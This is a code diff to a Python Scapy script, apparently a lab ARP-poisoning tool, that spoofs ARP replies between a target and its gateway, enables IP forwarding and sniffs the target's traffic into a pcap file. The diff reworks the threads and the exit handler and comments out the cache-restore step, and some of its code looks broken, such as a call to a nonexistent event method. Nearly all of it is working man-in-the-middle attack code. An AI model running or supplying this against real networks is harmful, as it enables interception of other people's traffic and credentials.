@@ -3,13 +3,20 @@ import os, sys, signal, threading
 
 
 def signalHandler(signal, frame):
+    print("[*] stopping....")
     global gateway_ip
     global gateway_mac
     global target_ip
     global target_mac
-    restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
-    print("[*] exit stop")
+    global re
+
+    re.event()
+
+    time.sleep(2)
     sys.exit(1)
+    
+    #restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
+    
 
 # register signal handler
 signal.signal(signal.SIGINT, signalHandler)
@@ -23,15 +30,21 @@ except IndexError:
     sys.exit(1)
 
 
+conf.verb = 0
 packet_count = 20
+
 conf.iface = interface
+print("[*] Setting up %s" % interface)
+
+target_mac = "08:00:27:5a:01:02"
+print("[*] Target %s is at %s" % (target_ip,target_mac))
+
+gateway_mac = "08:00:27:5a:01:01"
+print("[*] Gateway %s is at %s" % (gateway_ip,gateway_mac))
 
 
 # enabel ipv4 forward
 os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
-#fo = open('/proc/sys/net/ipv4/ip_forward','w')
-#fo.write('1')
-#fo.close()
 
 
 def restore_target(gateway_ip,gateway_mac,target_ip,target_mac):
@@ -41,6 +54,7 @@ def restore_target(gateway_ip,gateway_mac,target_ip,target_mac):
     hwdst="ff:ff:ff:ff:ff:ff",hwsrc=gateway_mac),count=5)
     send(ARP(op=2, psrc=target_ip, pdst=gateway_ip,
     hwdst="ff:ff:ff:ff:ff:ff",hwsrc=target_mac),count=5)
+
     # signals the main thread to exit
     
 
@@ -75,23 +89,19 @@ def get_mac_(ip_address):
 
 
 def start_sniffing(interface, gateway_ip, gateway_mac, target_ip,target_mac, filter=None, packet_count=1000):
-    # register signal handler
-    signal.signal(signal.SIGINT, signalHandler)
+
     print("[*] Starting sniffer on %s for %d packets" % (interface, packet_count))
     if filter:
         packets = sniff(filter=filter, count=packet_count,iface=interface, prn = lambda x: x.show())
         wrpcap('arper.pcap',packets)
         return
     else:
-        print(22)
         packets = sniff(filter="ip host %s" % target_ip, count=packet_count, iface=interface, prn = lambda x: x.show())
         wrpcap('arper.pcap',packets)
         return
     
 
 def poison_target(gateway_ip,gateway_mac,target_ip,target_mac,event):
-    # register signal handler
-    signal.signal(signal.SIGINT, signalHandler)
     
     poison_target = ARP()
     poison_target.op = 2
@@ -110,40 +120,24 @@ def poison_target(gateway_ip,gateway_mac,target_ip,target_mac,event):
         send(poison_gateway)
         time.sleep(1)
 
-    #    except KeyboardInterrupt:
-    #        print("[*] poison stop")
-    #        restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
-    #        return
-        
     print("[*] ARP poison attack finished.")
     return
 
 
-try:
-    conf.verb = 0
-    print("[*] Setting up %s" % interface)
-    target_mac = "08:00:27:5a:01:02"
-    gateway_mac = "08:00:27:5a:01:01"
-    #gateway_mac = "52:54:00:12:35:02"
-    print("[*] Target %s is at %s" % (target_ip,target_mac))
-    print("[*] Gateway %s is at %s" % (gateway_ip,gateway_mac))
-    # start poison thread
-    
-    re = threading.Event()
-    re.set()
+re = threading.Event()
+re.set()
 
-    poison_thread = threading.Thread(target = poison_target, args = (gateway_ip, gateway_mac,target_ip,target_mac, re))
-    poison_thread.deamon = True
-    poison_thread.start()
-    poison_thread.join()
+poison_thread = threading.Thread(target = poison_target, args = (gateway_ip, gateway_mac,target_ip,target_mac, re))
+poison_thread.deamon = True
+poison_thread.start()
 
-    sniff_thread = threading.Thread(target = start_sniffing, args = (interface, gateway_ip,gateway_mac,target_ip,target_mac))
-    sniff_thread.deamon = True
-    sniff_thread.start()
-    sniff_thread.join()
+sniff_thread = threading.Thread(target = start_sniffing, args = (interface, gateway_ip,gateway_mac,target_ip,target_mac))
+sniff_thread.deamon = True
+sniff_thread.start()
 
-except KeyboardInterrupt:
-    restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
-    print("[*] Done")
+
+#except KeyboardInterrupt:
+#    restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
+#    print("[*] Done")
     #poison_thread.stop()
     #sniff_thread.stop()
